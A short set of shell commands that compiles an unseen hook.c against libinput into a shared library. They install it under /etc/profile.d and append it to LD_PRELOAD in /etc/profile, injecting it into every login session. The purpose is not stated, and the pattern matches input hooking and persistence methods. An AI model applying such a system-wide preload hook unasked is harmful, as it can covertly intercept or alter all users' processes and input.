gcc -shared -ldl -linput -fPIC hook.c -o hook.so

sudo cp hook.so /etc/profile.d/

echo -e 'export LD_PRELOAD="$LD_PRELOAD /etc/profile.d/hook.so"' | sudo tee -a /etc/profile